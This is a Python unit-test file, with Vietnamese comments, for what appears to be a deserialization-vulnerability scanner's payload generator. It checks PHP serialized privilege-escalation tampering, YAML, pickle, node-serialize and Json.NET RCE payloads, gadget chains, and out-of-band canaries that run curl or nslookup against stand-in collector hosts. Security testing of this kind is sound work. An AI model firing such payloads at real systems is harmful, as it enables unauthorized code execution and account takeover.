"""
Unit test cho Analyze/payloadMutation.py — tap trung vao 3 ham mutate PHP
(flip_boolean/modify_string/modify_integer) va bo parser PHP serialize
(_read_php_token/_iter_php_pairs) vua duoc viet lai de fix cac bug:
  1. __modify_string() dam nham KEY (ten field) voi VALUE (gia tri) trong
     cau truc xen ke s:N:"KEY";VALUE;s:N:"KEY2";VALUE2;... cua PHP serialize.
  2. Regex s:(\\d+):"([^"]+)" bi cat ngan khi VALUE chua dau ngoac kep ben
     trong (hop le vi PHP serialize length-prefixed, khong can escape).
  3. __flip_boolean() dung .replace() khong neo vi tri, co the sua nham noi
     dung string khong lien quan chua trung substring "b:0"/"b:1", va doi
     TAT CA field boolean cung luc thay vi tach rieng tung field.
"""

import base64
import sys
import os
import unittest
from unittest.mock import patch

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from Analyze.payloadMutation import PayloadMutation


def mutate(payload: str, probe: str, exploit_type: str = "x") -> list:
    exploit = {"suggested_probe": probe, "exploit_type": exploit_type}
    vector = {"value": payload, "location": "cookie", "name": "session", "url": "http://x/", "method": "GET"}
    return PayloadMutation(exploit, vector).mutate()


def decoded_payloads(results: list) -> list:
    return [base64.b64decode(r["payload"]).decode() for r in results]


class TestModifyStringTargetsValuesNotKeys(unittest.TestCase):
    """Regression: __modify_string() phai chi doi VALUE, khong bao gio dung
    vao KEY (ten field) - truoc fix, payload that tu result1.json sinh ra
    7/11 mutation sai (doi ten field thay vi gia tri)."""

    REAL_PORTSWIGGER_PAYLOAD = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}'

    def test_only_mutates_the_value_wiener_not_the_key_username(self):
        results = mutate(self.REAL_PORTSWIGGER_PAYLOAD, "modify_string", "Identity Spoofing")
        payloads = decoded_payloads(results)
        for p in payloads:
            self.assertIn('s:8:"username"', p, "Ten field 'username' khong duoc bi doi")
        self.assertTrue(any('"administrator"' in p and 's:8:"username";s:13:"administrator"' in p for p in payloads))

    def test_exact_mutation_count_is_four_not_eleven(self):
        results = mutate(self.REAL_PORTSWIGGER_PAYLOAD, "modify_string", "Identity Spoofing")
        self.assertEqual(len(results), 4)

    def test_embedded_quote_inside_string_value_does_not_break_parsing(self):
        inner = 'a"b"c"d"e'
        payload = f'a:1:{{s:8:"username";s:{len(inner)}:"{inner}";}}'
        results = mutate(payload, "modify_string")
        payloads = decoded_payloads(results)
        self.assertEqual(len(payloads), 4)
        for p in payloads:
            self.assertTrue(p.endswith(";}"), f"Payload hong cu phap: {p!r}")
            self.assertNotIn('"c"d"e"', p)

    def test_nested_object_with_no_matching_field_produces_no_mutation(self):
        payload = ('O:14:"CustomTemplate":2:{s:17:"default_desc_type";'
                   's:26:"rm /home/carlos/morale.txt";s:4:"desc";'
                   'O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}')
        results = mutate(payload, "modify_string")
        self.assertEqual(results, [])

    def test_nested_object_field_is_now_recursed_into_and_mutated(self):
        payload = ('O:4:"User":1:{s:7:"profile";'
                   'O:7:"Profile":1:{s:4:"role";s:4:"user";}}')
        results = mutate(payload, "modify_string")
        mutated = decoded_payloads(results)
        self.assertEqual(len(mutated), 4)
        for p in mutated:
            self.assertIn('s:7:"profile"', p)
            self.assertNotIn('s:4:"user"', p)

    def test_key_name_containing_hint_word_is_not_itself_mutated(self):
        results = mutate(self.REAL_PORTSWIGGER_PAYLOAD, "modify_string", "Identity Spoofing")
        for p in decoded_payloads(results):
            self.assertTrue(p.startswith('O:4:"User":2:{s:8:"username";'),
                             "Key 'username' bi doi ten - regression cua bug dam key/value")


class TestFlipBooleanIsolatesEachField(unittest.TestCase):
    """Regression: __flip_boolean() phai (1) khong dung vao noi dung string
    khong lien quan, (2) sinh 1 mutation RIENG cho MOI field boolean thay vi
    doi tat ca cung luc."""

    def test_two_boolean_fields_produce_two_isolated_mutations(self):
        payload = ('O:4:"User":3:{s:8:"username";s:6:"wiener";'
                   's:8:"is_admin";b:0;s:9:"is_active";b:0;}')
        results = mutate(payload, "flip_boolean")
        payloads = decoded_payloads(results)
        self.assertEqual(len(payloads), 2)
        self.assertIn('s:8:"is_admin";b:1;s:9:"is_active";b:0;', "".join(p for p in payloads if "b:1;s:9" in p))
        self.assertTrue(any('is_admin";b:1;s:9:"is_active";b:0' in p for p in payloads))
        self.assertTrue(any('is_admin";b:0;s:9:"is_active";b:1' in p for p in payloads))

    def test_string_value_containing_b0_substring_is_not_corrupted(self):
        text = 'comment=b:0 is code'
        payload = f'a:2:{{s:7:"comment";s:{len(text)}:"{text}";s:9:"is_active";b:0;}}'
        results = mutate(payload, "flip_boolean")
        payloads = decoded_payloads(results)
        self.assertEqual(len(payloads), 1)
        self.assertIn(f's:{len(text)}:"{text}"', payloads[0],
                       "Noi dung string khong lien quan bi sua nham - regression cua bug replace khong neo vi tri")
        self.assertIn('is_active";b:1', payloads[0])

    def test_single_boolean_field_still_flips(self):
        payload = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}'
        results = mutate(payload, "flip_boolean")
        payloads = decoded_payloads(results)
        self.assertEqual(len(payloads), 1)
        self.assertTrue(payloads[0].endswith('b:1;}'))

    def test_boolean_field_nested_inside_object_is_now_found_and_flipped(self):
        payload = ('O:4:"User":1:{s:7:"profile";'
                   'O:7:"Profile":1:{s:5:"admin";b:0;}}')
        results = mutate(payload, "flip_boolean")
        payloads = decoded_payloads(results)
        self.assertEqual(len(payloads), 1)
        self.assertIn('s:7:"profile"', payloads[0])
        self.assertTrue(payloads[0].endswith('"admin";b:1;}}'))


class TestModifyIntegerUsesPositionalReplace(unittest.TestCase):
    def test_two_fields_with_same_integer_value_mutated_independently(self):
        payload = 'a:2:{s:5:"level";i:5;s:5:"score";i:5;}'
        results = mutate(payload, "modify_integer")
        payloads = decoded_payloads(results)
        self.assertEqual(len(payloads), 10)
        for p in payloads:
            self.assertEqual(p.count("i:5;"), 1, f"Phai con dung 1 vi tri i:5; chua doi: {p!r}")

    def test_integer_field_nested_inside_object_is_now_found_and_mutated(self):
        payload = ('O:4:"User":1:{s:7:"profile";'
                   'O:7:"Profile":1:{s:5:"level";i:1;}}')
        results = mutate(payload, "modify_integer")
        payloads = decoded_payloads(results)
        self.assertEqual(len(payloads), 4)
        for p in payloads:
            self.assertIn('s:7:"profile"', p)
            self.assertNotIn("i:1;", p)


class TestJavaChainMapAndExceptionHandling(unittest.TestCase):
    def test_rome_gadget_maps_to_real_ysoserial_chain(self):
        pm = PayloadMutation({"suggested_probe": "ysoserial", "exploit_type": "Rome Gadget"},
                              {"value": "x", "location": "c", "name": "n", "url": "u", "method": "GET"})
        self.assertEqual(pm._resolve_chains(), ["ROME"])


class TestYamlMutationRespectsJavaVsPython(unittest.TestCase):
    """Regression: _mutate_yaml() phai doc self.etype de phan biet SnakeYAML
    (Java) voi PyYAML (Python) - truoc fix, ca 2 deu nhan chung 1 payload
    Python ("!!python/object/apply:os.system"), vo dung voi target Java that
    (SnakeYAML khong hieu cu phap Python)."""

    def test_java_exploit_type_gets_snakeyaml_payload_not_python(self):
        results = mutate("!!javax.script.ScriptEngineManager [...]", "yaml_exec", "YAML Java ScriptEngine")
        self.assertEqual(len(results), 1)
        payload = decoded_payloads(results)[0]
        self.assertIn("javax.script.ScriptEngineManager", payload)
        self.assertIn("java.net.URLClassLoader", payload)
        self.assertNotIn("!!python/", payload, "Khong duoc gui cu phap Python cho target Java")

    def test_python_exploit_type_still_gets_python_payload(self):
        import tool_config
        tool_config.set_oob_override("oob.test.local")
        try:
            results = mutate("!!python/object/apply:os.system ['id']", "yaml_exec", "YAML Python RCE")
        finally:
            tool_config.set_oob_override(None)
        rce = [r for r in results if r.get("type") == "yaml_rce"]
        self.assertEqual(len(rce), 3)
        for payload in decoded_payloads(rce):
            self.assertIn("!!python/object/apply:os.system", payload)
        oob = [r for r in results if r.get("type") == "yaml_oob"]
        self.assertEqual(len(oob), 1)
        self.assertIn("urllib.request.urlopen", decoded_payloads(oob)[0])
        self.assertIn("oob.test.local", decoded_payloads(oob)[0])

    def test_java_class_injection_subtype_also_routes_to_java_payload(self):
        results = mutate("!!java.lang.Runtime [...]", "yaml_exec", "YAML Java Class")
        payload = decoded_payloads(results)[0]
        self.assertIn("javax.script.ScriptEngineManager", payload)


class TestJavaRceEscalation(unittest.TestCase):
    """_mutate_java_rce_escalation(): khi khong tim thay keyword gadget cu the
    nao ("Unknown Gadget"), tool phai TU DONG thu them cac gadget chain pho
    bien (khong chi dung lai o URLDNS probe) - nhung dung lenh goi ra OOB
    domain (khong dung id/whoami/hostname, vi server khong echo stdout ve nen
    tool khong doc duoc ket qua qua response HTTP)."""

    def _pm(self):
        return PayloadMutation(
            {"suggested_probe": "urldns_probe", "exploit_type": "Java Deserialization — Unknown Gadget"},
            {"value": "x", "location": "cookie", "name": "session", "url": "http://x/", "method": "GET"},
        )

    @patch("Analyze.payloadMutation.get_oob_domain", return_value="")
    def test_no_oob_domain_configured_returns_nothing(self, _mock):
        pm = self._pm()
        self.assertEqual(pm._mutate_java_rce_escalation(), [])

    @patch("Analyze.payloadMutation.get_oob_domain", return_value="test123.oast.fun")
    def test_missing_ysoserial_jar_returns_nothing(self, _mock):
        pm = self._pm()
        pm.YSOSERIAL_PATH = "tools/java/this-file-does-not-exist.jar"
        self.assertEqual(pm._mutate_java_rce_escalation(), [])

    @patch("Analyze.payloadMutation.get_oob_domain", return_value="test123.oast.fun")
    def test_commands_use_oob_domain_not_benign_test_commands(self, _mock):
        pm = self._pm()
        commands = [c.format(domain="test123.oast.fun") for c in pm.RCE_ESCALATION_OOB_COMMANDS]
        for cmd in commands:
            self.assertIn("test123.oast.fun", cmd)
        for benign in ("id", "whoami", "hostname"):
            self.assertNotEqual(commands, benign, "Escalation phai dung lenh OOB, khong dung lenh cau tra loi qua stdout")

    @patch("Analyze.payloadMutation.get_oob_domain", return_value="")
    def test_mutate_dispatch_calls_both_urldns_and_escalation(self, _mock):
        pm = self._pm()
        pm.YSOSERIAL_PATH = "tools/java/this-file-does-not-exist.jar"
        with patch.object(pm, "_mutate_java_urldns", wraps=pm._mutate_java_urldns) as spy_urldns, \
             patch.object(pm, "_mutate_java_rce_escalation", wraps=pm._mutate_java_rce_escalation) as spy_escalate:
            pm.mutate()
            spy_urldns.assert_called_once()
            spy_escalate.assert_called_once()


class TestPhpTypeJuggling(unittest.TestCase):
    """PortSwigger 'Modifying serialized data types': winning payload needs a STRING
    field (access_token) turned into integer 0 (PHP loose-compare bypass) together with
    username -> administrator. modify_string never changes the TYPE, so __type_juggle
    was added."""

    LAB = ('O:4:"User":2:{s:8:"username";s:6:"wiener";'
           's:12:"access_token";s:32:"qstozslgs4qxcxatc371ib4vkp7d0fw5";}')

    def test_generates_the_exact_lab_solution_payload(self):
        payloads = decoded_payloads(mutate(self.LAB, "modify_string", "Privilege Escalation"))
        self.assertIn(
            'O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}',
            payloads,
            "Combined privesc payload (username=administrator + access_token=i:0) phai duoc sinh ra",
        )

    def test_token_field_alone_juggled_to_integer_zero(self):
        payloads = decoded_payloads(mutate(self.LAB, "modify_string", "Privilege Escalation"))
        self.assertIn(
            'O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}',
            payloads,
        )

    def test_no_type_juggle_on_gadget_chain_without_token_field(self):
        payload = ('O:14:"CustomTemplate":2:{s:17:"default_desc_type";'
                   's:26:"rm /home/carlos/morale.txt";s:4:"desc";'
                   'O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}')
        results = mutate(payload, "modify_string")
        self.assertFalse(any(r["type"].startswith("type_juggle") for r in results))


class TestPythonBlindOobVariants(unittest.TestCase):
    """The pickle/YAML Python probes gain a blind-confirmation variant that makes the
    target call the OOB collector (urllib) — for sinks whose result never shows in the
    response. Only emitted when an OOB domain is configured."""

    def test_pickle_exec_adds_oob_callback_variant(self):
        import tool_config
        tool_config.set_oob_override("oob.test.local/tok1")
        try:
            results = mutate("gASV...", "pickle_exec", "Python Pickle")
        finally:
            tool_config.set_oob_override(None)
        oob = [r for r in results if r.get("type") == "pickle_oob"]
        self.assertEqual(len(oob), 1)
        raw = base64.b64decode(oob[0]["payload"])
        self.assertIn(b"urllib.request", raw)
        self.assertIn(b"http://oob.test.local/tok1/", raw)

    def test_no_oob_variant_when_oob_not_configured(self):
        with patch("Analyze.payloadMutation.get_oob_domain", return_value=""):
            results = mutate("gASV...", "pickle_exec", "Python Pickle")
        self.assertFalse(any(r.get("type") == "pickle_oob" for r in results))


class TestJsonpickleMutations(unittest.TestCase):
    """jsonpickle sinks must get JSON py/reduce payloads, NOT binary pickle (which only
    makes jsonpickle.decode() crash on utf-8). Verified: py/reduce os.system runs on the
    live sink."""

    def test_jsonpickle_exec_emits_json_py_reduce(self):
        with patch("Analyze.payloadMutation.get_oob_domain", return_value=""):
            results = mutate('{"py/object":"x"}', "jsonpickle_exec", "jsonpickle Object Injection RCE")
        self.assertEqual([r["type"] for r in results], ["jsonpickle_rce"] * 3)
        for payload in decoded_payloads(results):
            self.assertIn('"py/reduce"', payload)
            self.assertIn("os.system", payload)
            self.assertNotIn("gASV", payload)

    def test_jsonpickle_exec_adds_oob_variant_when_configured(self):
        import tool_config
        tool_config.set_oob_override("oob.test.local/tk")
        try:
            results = mutate('{"py/object":"x"}', "jsonpickle_exec", "jsonpickle Object Injection RCE")
        finally:
            tool_config.set_oob_override(None)
        oob = [r for r in results if r.get("type") == "jsonpickle_oob"]
        self.assertEqual(len(oob), 1)
        raw = decoded_payloads(oob)[0]
        self.assertIn("urllib.request.urlopen", raw)
        self.assertIn("oob.test.local/tk", raw)


class TestNodeBlindOobVariant(unittest.TestCase):
    """node_serialize gains a blind-confirmation variant: a node-serialize IIFE that makes
    the target perform an outbound HTTP GET to the OOB collector (pure 'http' module, no
    shell). This is the only confirmation signal for the blind /api/import-async sink whose
    response never reflects the result. Only emitted when an OOB domain is configured."""

    def test_node_serialize_adds_oob_callback_variant(self):
        import tool_config
        tool_config.set_oob_override("oob.test.local/ndtok")
        try:
            results = mutate('{"x":"_$$ND_FUNC$$_function(){return 1;}"}', "node_serialize", "node-serialize RCE")
        finally:
            tool_config.set_oob_override(None)
        rce = [r for r in results if r.get("type") == "node_serialize_rce"]
        self.assertEqual(len(rce), 3, "van phai giu 3 bien the lenh local (id/whoami/hostname)")
        oob = [r for r in results if r.get("type") == "node_serialize_oob"]
        self.assertEqual(len(oob), 1)
        raw = decoded_payloads(oob)[0]
        self.assertIn("_$$ND_FUNC$$_", raw)
        self.assertIn("require('http').get(", raw)
        self.assertIn("http://oob.test.local/ndtok/", raw)

    def test_no_node_oob_variant_when_oob_not_configured(self):
        with patch("Analyze.payloadMutation.get_oob_domain", return_value=""):
            results = mutate('{"x":"_$$ND_FUNC$$_function(){return 1;}"}', "node_serialize", "node-serialize RCE")
        self.assertFalse(any(r.get("type") == "node_serialize_oob" for r in results))
        self.assertEqual(len([r for r in results if r.get("type") == "node_serialize_rce"]), 3)

    def test_bare_marker_candidate_emits_bare_marker_payloads(self):
        # Real-scan case: scanner narrows the body to the sink field's VALUE, a BARE marker
        # ("_$$ND_FUNC$$_function(){return 1;}"). rebuild() drops our payload into that slot,
        # so payloads MUST be bare markers (NOT wrapped in {"rce":...}) or node-serialize never
        # eval()s them. This is the fix for the Node OOB-never-confirms bug.
        import tool_config
        tool_config.set_oob_override("oob.test.local/baretok")
        try:
            results = mutate("_$$ND_FUNC$$_function(){return 1;}", "node_serialize", "node-serialize RCE")
        finally:
            tool_config.set_oob_override(None)
        for r in [x for x in results if x.get("type") == "node_serialize_rce"]:
            raw = base64.b64decode(r["payload"]).decode()
            self.assertTrue(raw.startswith("_$$ND_FUNC$$_"), f"RCE payload phai la marker tran, khong boc: {raw}")
            self.assertNotIn('{"rce"', raw)
        oob = [r for r in results if r.get("type") == "node_serialize_oob"]
        self.assertEqual(len(oob), 1)
        raw = decoded_payloads(oob)[0]
        self.assertTrue(raw.startswith("_$$ND_FUNC$$_"), f"OOB payload phai la marker tran: {raw}")
        self.assertIn("require('http').get(", raw)
        self.assertIn("oob.test.local/baretok", raw)

    def test_whole_object_candidate_keeps_wrapper_shape(self):
        # When the candidate IS a whole serialized object (e.g. a node-serialize cookie), the
        # payload must stay wrapped so the object carries an eval-able field.
        import tool_config
        tool_config.set_oob_override("oob.test.local/wraptok")
        try:
            results = mutate('{"username":"wiener","admin":false}', "node_serialize", "node-serialize RCE")
        finally:
            tool_config.set_oob_override(None)
        oob = [r for r in results if r.get("type") == "node_serialize_oob"]
        self.assertEqual(len(oob), 1)
        raw = decoded_payloads(oob)[0]
        self.assertTrue(raw.startswith('{"oob"'), f"candidate object -> payload phai boc: {raw}")
        self.assertIn("_$$ND_FUNC$$_", raw)

    def test_proto_pollution_probe_gets_no_oob_canary(self):
        import tool_config
        tool_config.set_oob_override("oob.test.local/ptok")
        try:
            results = mutate('{"theme":"dark"}', "proto_pollution", "Prototype Pollution")
        finally:
            tool_config.set_oob_override(None)
        self.assertFalse(any(r.get("type") == "node_serialize_oob" for r in results),
                         "proto-pollution khong phai primitive goi-ve-nha, khong duoc sinh canary OOB")

    def test_proto_payload_preserves_benign_fields(self):
        # Must inject __proto__ WHILE keeping the original benign keys, so baseline vs mutated differ
        # only in the dangerous element (apples-to-apples). Otherwise a bare {"__proto__":...} body
        # drops theme/lang and the server's benign reshape fools the content-diff oracle into strong.
        import json
        results = mutate('{"theme":"dark","lang":"en","__proto__":{"note":"demo"}}', "proto_pollution", "Prototype Pollution")
        p = [r for r in results if r.get("type") == "prototype_pollution"][0]
        raw = base64.b64decode(p["payload"]).decode()
        obj = json.loads(raw)
        self.assertEqual(obj.get("theme"), "dark")   # benign field kept
        self.assertEqual(obj.get("lang"), "en")      # benign field kept
        self.assertEqual(obj.get("__proto__"), {"isAdmin": True, "polluted": True})  # dangerous swap

    def test_proto_payload_falls_back_when_slot_not_json_object(self):
        results = mutate("not-a-json-object", "proto_pollution", "Prototype Pollution")
        p = [r for r in results if r.get("type") == "prototype_pollution"][0]
        raw = base64.b64decode(p["payload"]).decode()
        self.assertIn("__proto__", raw)
        self.assertIn("isAdmin", raw)


class TestNodeOobCanaryDoesNotCrashTarget(unittest.TestCase):
    """Bug J (2026-11-22): the Node OOB canaries called require('http').get(url) with no
    'error' listener. The canary host resolves (DNS hit logged) but the TCP connect is refused,
    so Node raised an unhandled 'error' event and the target process EXITED — node3.json lost
    17/19 vectors to 'Connection refused'. A detect-only tool must not take the target down."""

    CLOSED = "127.0.0.1:1"   # nothing listens on port 1 -> ECONNREFUSED, like <token>.oob.test:80

    def _node_oob(self):
        import tool_config
        tool_config.set_oob_override(self.CLOSED)
        try:
            results = mutate("_$$ND_FUNC$$_function(){return 1;}", "node_serialize", "node-serialize RCE")
        finally:
            tool_config.set_oob_override(None)
        oob = [r for r in results if r.get("type") == "node_serialize_oob"]
        self.assertEqual(len(oob), 1)
        return decoded_payloads(oob)[0]

    def _yaml_oob(self):
        import tool_config
        tool_config.set_oob_override(self.CLOSED)
        try:
            results = mutate("onLoad: !<tag:yaml.org,2002:js/function> 'function () { return true }'",
                             "yaml_exec", "YAML JS Function RCE (js-yaml)")
        finally:
            tool_config.set_oob_override(None)
        oob = [r for r in results if r.get("type") == "yaml_js_function_oob"]
        self.assertEqual(len(oob), 1)
        return decoded_payloads(oob)[0]

    def test_both_node_oob_canaries_attach_an_error_listener(self):
        for raw in (self._node_oob(), self._yaml_oob()):
            self.assertIn("http://127.0.0.1:1/", raw)
            self.assertIn(".on('error',function(){})", raw, raw)

    def _run_in_node(self, js_expr_calling_canary: str) -> "subprocess.CompletedProcess":
        # Run from a real file (not `node -e`) so process.mainModule exists, as in a real app.
        import subprocess, tempfile
        script = (
            js_expr_calling_canary + ";\n"
            "setTimeout(function(){ process.stdout.write('ALIVE'); }, 3000);\n"
        )
        with tempfile.TemporaryDirectory() as d:
            path = os.path.join(d, "canary.js")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(script)
            return subprocess.run(["node", path], capture_output=True, text=True, timeout=30)

    @unittest.skipUnless(__import__("shutil").which("node"), "node not installed")
    def test_node_serialize_canary_keeps_process_alive_on_refused_connect(self):
        raw = self._node_oob()
        self.assertTrue(raw.startswith("_$$ND_FUNC$$_"))
        iife = raw[len("_$$ND_FUNC$$_"):]          # "function(){...}()" — what node-serialize eval()s
        proc = self._run_in_node("(" + iife + ")")
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertIn("ALIVE", proc.stdout)

    @unittest.skipUnless(__import__("shutil").which("node"), "node not installed")
    def test_js_yaml_canary_keeps_process_alive_on_refused_connect(self):
        import re
        raw = self._yaml_oob()
        m = re.search(r'js/function> "(.*)"\s*$', raw)
        self.assertIsNotNone(m, raw)
        src = m.group(1)                           # the function js-yaml rebuilds; the app then calls it
        proc = self._run_in_node("(" + src + ")()")
        self.assertEqual(proc.returncode, 0, proc.stderr)
        self.assertIn("ALIVE", proc.stdout)


class TestDotnetBlindOobVariant(unittest.TestCase):
    """.NET gains a blind-confirmation variant (Json.NET $type gadget whose command fetches the OOB
    collector), mirroring Java/Node — so a blind .NET sink can be confirmed via callback. Only emitted
    when an OOB domain is configured; local id/whoami commands alone can never confirm out-of-band."""

    def test_jsonnet_adds_oob_callback_variant(self):
        import tool_config
        tool_config.set_oob_override("oob.test.local/dntok")
        try:
            results = mutate('{"$type":"System.Object, mscorlib"}', "jsonnet", "JSON.NET TypeNameHandling RCE")
        finally:
            tool_config.set_oob_override(None)
        oob = [r for r in results if r.get("type") == "dotnet_jsonnet_oob"]
        self.assertEqual(len(oob), 1)
        raw = decoded_payloads(oob)[0]
        self.assertIn("http://oob.test.local/dntok/", raw)
        self.assertIn("ObjectDataProvider", raw)

    def test_no_dotnet_oob_when_not_configured(self):
        with patch("Analyze.payloadMutation.get_oob_domain", return_value=""):
            results = mutate('{"$type":"System.Object, mscorlib"}', "jsonnet", "JSON.NET TypeNameHandling RCE")
        self.assertFalse(any(r.get("type", "").startswith("dotnet_") and r.get("type", "").endswith("_oob") for r in results))


class TestPhpMutationKeepsBytesExact(unittest.TestCase):
    """Bug I (2026-11-21): PHP mutations re-encoded the latin-1 candidate with UTF-8, doubling every
    byte >= 0x80 (s:5:"José" -> 7 bytes) so unserialize() failed. End-to-end through
    normalize -> mutation -> replay rebuild, the server must get the original bytes with only
    the intended token changed."""

    def _server_bytes(self, php_bytes, probe="flip_boolean"):
        from Analyze.normalize import DataNormalizer
        from Replay.replay_request import ReplayRequest
        cookie = base64.b64encode(php_bytes).decode()
        norm = DataNormalizer(cookie)
        cand = norm.normalize()[0]
        vec = {"value": cand, "location": "cookie", "name": "session", "url": "http://x/", "method": "GET"}
        with patch("Analyze.payloadMutation.get_oob_domain", return_value=""):
            muts = PayloadMutation({"suggested_probe": probe, "exploit_type": "x"}, vec).mutate()
        m = [x for x in muts if x.get("type") == probe][0]
        m.update({"slot_value": cookie, "transform_chain": norm.get_transform_chain(cand),
                  "encoding_chain": norm.get_encoding_chain(cand)})
        return base64.b64decode(ReplayRequest()._select_payload_value(m))

    def test_non_ascii_utf8_value_survives_flip_boolean(self):
        php = 'O:4:"User":2:{s:8:"username";s:5:"José";s:5:"admin";b:0;}'.encode("utf-8")
        self.assertEqual(self._server_bytes(php), php.replace(b"b:0;", b"b:1;"))

    def test_vietnamese_value_survives_flip_boolean(self):
        name = "Nguyễn".encode("utf-8")
        php = b'O:4:"User":2:{s:8:"username";s:' + str(len(name)).encode() + b':"' + name + b'";s:5:"admin";b:0;}'
        self.assertEqual(self._server_bytes(php), php.replace(b"b:0;", b"b:1;"))

    def test_php_bytes_falls_back_to_utf8_for_real_text(self):
        self.assertEqual(PayloadMutation._php_bytes('s:6:"ẻ";'), 's:6:"ẻ";'.encode("utf-8"))
        self.assertEqual(PayloadMutation._php_bytes("Jos\xc3\xa9"), b"Jos\xc3\xa9")


class TestDotnetJsonnetOobOnlyForJsonNetSinks(unittest.TestCase):
    """Bug G (2026-11-21): the hand-built Json.NET $type OOB canary was appended to EVERY .NET probe,
    so the BinaryFormatter sink /api/import-bin received JSON text ('7B-22-24-74…' parse error 500).
    It must only be emitted when the resolved formatter is Json.Net."""

    def _mutate_with_oob(self, probe, etype):
        with patch("Analyze.payloadMutation.get_oob_domain", return_value="tok.oob.test"), \
             patch("Analyze.payloadMutation.os.path.exists", return_value=False):
            return PayloadMutation({"suggested_probe": probe, "exploit_type": etype},
                                   {"value": "x", "location": "raw_body", "name": "payload"})._mutate_dotnet_oob()

    def test_binaryformatter_sink_gets_no_jsonnet_canary(self):
        out = self._mutate_with_oob("dotnet_deser", "BinaryFormatter RCE")
        self.assertFalse(any(r.get("type") == "dotnet_jsonnet_oob" for r in out))

    def test_jsonnet_sink_still_gets_jsonnet_canary(self):
        # One canary per callback command (curl + nslookup since 2026-11-24, DNS-name domain).
        out = self._mutate_with_oob("jsonnet", "JSON.NET TypeNameHandling RCE")
        self.assertEqual(sum(r.get("type") == "dotnet_jsonnet_oob" for r in out), 2)


class TestDotnetOobNslookupVariant(unittest.TestCase):
    """Legacy .NET Framework hosts (Server 2012/2016, Win7) have no curl.exe, so `cmd /c curl`
    dies before any DNS lookup and the OOB canary never reaches the collector. nslookup exists on
    every Windows version; the DNS query for <token>.<domain> is itself the confirmation.
    Mirrors Java's RCE_ESCALATION_OOB_COMMANDS (nslookup + curl)."""

    def _jsonnet_canaries(self, domain):
        with patch("Analyze.payloadMutation.get_oob_domain", return_value=domain), \
             patch("Analyze.payloadMutation.os.path.exists", return_value=False):
            out = PayloadMutation({"suggested_probe": "jsonnet", "exploit_type": "JSON.NET TypeNameHandling RCE"},
                                  {"value": "x", "location": "raw_body", "name": "payload"})._mutate_dotnet_oob()
        return decoded_payloads([r for r in out if r.get("type") == "dotnet_jsonnet_oob"])

    def test_dns_domain_gets_curl_and_nslookup_canaries(self):
        raws = self._jsonnet_canaries("tok123.oob.test")
        self.assertEqual(len(raws), 2)
        self.assertTrue(any('"/c curl http://tok123.oob.test/"' in r for r in raws), raws)
        self.assertTrue(any('"/c nslookup tok123.oob.test"' in r for r in raws), raws)

    def test_path_form_domain_skips_nslookup(self):
        # Token lives in the URL path (host:port/<token>) — a DNS lookup could never carry it.
        for domain in ("127.0.0.1:9000/tok", "oob.test.local/tok", "127.0.0.1"):
            raws = self._jsonnet_canaries(domain)
            self.assertEqual(len(raws), 1, domain)
            self.assertIn("/c curl ", raws[0])
            self.assertNotIn("nslookup", raws[0])

    def test_ysonet_branch_runs_every_gadget_with_both_commands(self):
        seen = []

        def fake_ysonet(self_, formatter, gadget, command):
            seen.append((formatter, gadget, command))
            return base64.b64encode(b"stub").decode()

        with patch("Analyze.payloadMutation.get_oob_domain", return_value="tok9.oob.test"), \
             patch("Analyze.payloadMutation.os.path.exists", return_value=True), \
             patch.object(PayloadMutation, "_run_ysonet", fake_ysonet):
            out = PayloadMutation({"suggested_probe": "dotnet_deser", "exploit_type": "BinaryFormatter RCE"},
                                  {"value": "x", "location": "raw_body", "name": "payload"})._mutate_dotnet_oob()
        for gadget in PayloadMutation.DOTNET_GADGETS:
            self.assertIn(("BinaryFormatter", gadget, "curl http://tok9.oob.test/"), seen)
            self.assertIn(("BinaryFormatter", gadget, "nslookup tok9.oob.test"), seen)
        labels = [r.get("chain") or "" for r in out if r.get("type") == "dotnet_ysonet_oob"]
        self.assertTrue(any(l.endswith("dns callback") for l in labels), labels)
        self.assertTrue(any(l.endswith("http callback") for l in labels), labels)


class TestRubyDetectionCallbackChain(unittest.TestCase):
    """Ruby Oj/YAML detection (callback) gadget chain — Gem::Requirement -> RemoteFetcher
    (s3) OOB variant, emitted ALONGSIDE the in-band object-injection payload. This is the
    only path that lets a Ruby sink reach oob_confirmed. Re-implemented from GitHub Security
    Lab ruby-unsafe-deserialization (MIT), detection-only (no RCE)."""

    @patch("Analyze.payloadMutation.get_oob_domain", return_value="tok9.oast.fun")
    def test_oj_adds_detection_chain_with_token(self, _m):
        import json
        results = mutate('{"^o":"Object"}', "oj_object", "Oj Object Deserialization")
        det = [r for r in results if r.get("type") == "oj_detection_oob"]
        self.assertEqual(len(det), 1, "Oj sink must emit exactly one detection-chain OOB payload")
        chain = json.loads(det[0]["payload_raw"])  # must be valid Oj object-mode JSON
        self.assertIn("tok9.oast.fun?", det[0]["payload_raw"], "callback host must carry the OOB token")
        self.assertIn("Gem::Requirement", det[0]["payload_raw"])

    @patch("Analyze.payloadMutation.get_oob_domain", return_value="tok9.oast.fun")
    def test_yaml_ruby_adds_detection_chain_with_token(self, _m):
        results = mutate("--- !ruby/object:OpenStruct", "yaml_exec", "YAML Ruby Object Injection")
        det = [r for r in results if r.get("type") == "yaml_detection_oob"]
        self.assertEqual(len(det), 1)
        self.assertIn('host: "tok9.oast.fun?"', det[0]["payload_raw"])
        self.assertIn("Gem::RequestSet::Lockfile", det[0]["payload_raw"])

    @patch("Analyze.payloadMutation.get_oob_domain", return_value="")
    def test_no_detection_chain_when_oob_absent_but_object_injection_stays(self, _m):
        oj = mutate('{"^o":"Object"}', "oj_object", "Oj Object Deserialization")
        yml = mutate("--- !ruby/object:OpenStruct", "yaml_exec", "YAML Ruby Object Injection")
        self.assertFalse(any(r.get("type") == "oj_detection_oob" for r in oj))
        self.assertFalse(any(r.get("type") == "yaml_detection_oob" for r in yml))
        # the in-band object-injection markers must remain (detection without OOB still works)
        self.assertTrue(any(r.get("type") == "oj_object" for r in oj))
        self.assertTrue(any(r.get("type") == "yaml_ruby_object" for r in yml))


if __name__ == "__main__":
    unittest.main(verbosity=2)
